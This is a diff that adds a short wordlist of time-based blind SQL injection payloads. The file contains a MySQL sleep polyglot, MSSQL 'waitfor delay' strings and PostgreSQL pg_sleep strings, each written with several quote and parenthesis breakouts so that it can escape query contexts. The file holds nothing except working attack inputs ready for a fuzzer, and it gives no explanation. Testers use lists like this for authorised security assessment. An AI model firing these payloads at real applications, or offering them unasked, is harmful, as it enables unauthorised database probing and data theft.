@@ -1,0 +1,14 @@
+if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0))OR"*/
+2943983;waitfor delay '0:0:10'--
+2943983';waitfor delay '0:0:10'--
+2943983";waitfor delay '0:0:10'--
+2943983);waitfor delay '0:0:10'--
+2943983));waitfor delay '0:0:10'--
+2943983');waitfor delay '0:0:10'--
+2943983'));waitfor delay '0:0:10'--
+ and pg_sleep(10)--1
+" and pg_sleep(10)--1
+' and pg_sleep(10)--1
+) and pg_sleep(10)--1
+") and pg_sleep(10)--1
+') and pg_sleep(10)--1
